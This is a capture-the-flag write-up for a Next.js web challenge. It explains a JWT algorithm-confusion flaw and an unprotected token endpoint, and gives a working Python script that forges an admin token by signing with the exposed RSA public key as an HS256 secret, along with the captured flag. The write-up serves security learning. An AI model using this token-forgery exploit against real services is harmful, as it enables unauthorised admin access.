# Next Jason - 359 pts

> **Category:** Web
> **Difficulty:** Medium
> **Solves:** ???
> **Status:** Solved

---

## Challenge Description

> At least JSON has only one pronunciation, unlike GIF. JWT too, I guess?

**Attachments:** [next_jason.zip](files/next_jason.zip)
**Instance:** `http://9388b44825e2.challs.ctf.r0devnull.team:8001/`

---

## Reconnaissance

- Next.js application with JWT authentication
- Key endpoints:
  - `/api/login` — login with username (blocks "admin")
  - `/api/getFlag` — requires admin token
  - `/api/getPublicKey` — exposes RSA public key
  - `/token/sign` — signs JWT with RS256 (unprotected by middleware)
  - `/token/verify` — verifies JWT (accepts RS256 **and** HS256)
- Middleware only protects `/api/*` routes, not `/token/*`

---

## Analysis

### Key Observations

- `middleware.js:45-47` — matcher only applies to `/api/:path*`
- `app/token/verify/route.js:8` — accepts both `['RS256', 'HS256']`
- `/token/sign` is unprotected — can get valid guest token without invite code

### Vulnerability / Weakness

JWT Algorithm Confusion (CVE-2016-10555) — server signs with RS256 (asymmetric) but accepts HS256 (symmetric) for verification. Public key is exposed, allowing attacker to sign forged tokens using the public key as HMAC secret.

---

## Solution

### Approach

1. Call `/token/sign` with `{"username": "guest"}` to get valid token (bypasses middleware)
2. Use guest token to access `/api/getPublicKey` and retrieve RSA public key
3. Forge new JWT with `{"username": "admin"}` signed with HS256 using public key as secret
4. Set forged token as cookie and request `/api/getFlag`

### Exploit / Script

```python
#!/usr/bin/env python3
# Next Jason_Solution.py - Null CTF 2025

import requests
import sys
from jwcrypto import jwt, jwk
import base64

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.4.205:3000"

def get_public_key(session):
    # Get guest token from unprotected endpoint
    resp = session.post(f"{BASE_URL}/token/sign", json={"username": "guest"})
    guest_token = resp.json()["token"]
    session.cookies.set("token", guest_token)
    return session.get(f"{BASE_URL}/api/getPublicKey")

def forge_admin_token(public_key):
    # Use public key as HMAC secret for HS256
    key = jwk.JWK(kty="oct", k=base64.urlsafe_b64encode(public_key.encode()).decode().rstrip("="))
    token = jwt.JWT(header={"alg": "HS256"}, claims={"username": "admin"})
    token.make_signed_token(key)
    return token.serialize()

def get_flag(session, token):
    session.cookies.set("token", token)
    return session.get(f"{BASE_URL}/api/getFlag").json()["flag"]

def main():
    session = requests.Session()
    public_key = get_public_key(session).json()["PUBKEY"]
    token = forge_admin_token(public_key)
    flag = get_flag(session, token)
    print(f'Flag: {flag}')

if __name__ == "__main__":
    main()
```

### Execution

```bash
$ python3 "Next Jason_Solution.py" http://9388b44825e2.challs.ctf.r0devnull.team:8001/
Flag: nullctf{f0rg3_7h15_cv3_h3h_d4ed26ca37802e2a}
```

---

## Flag

```
nullctf{f0rg3_7h15_cv3_h3h_d4ed26ca37802e2a}
```

---

## Lessons Learned

- Always check JWT verification accepts only the expected algorithm
- Middleware route matchers can leave endpoints unprotected
- PyJWT 2.x blocks algorithm confusion by default; `jwcrypto` does not

---

## Resources

- [JWT Algorithm Confusion - PortSwigger](https://portswigger.net/web-security/jwt/algorithm-confusion)
- [CVE-2016-10555](https://nvd.nist.gov/vuln/detail/CVE-2016-10555)

---

## Files

| File | Description |
|------|-------------|
| [Next Jason_Solution.py](Next%20Jason_Solution.py) | Solution script |
| [files/](files/) | Challenge source code |

---

*Tags: #nullctf2025 #web #jwt #algorithm-confusion #hs256 #rs256*
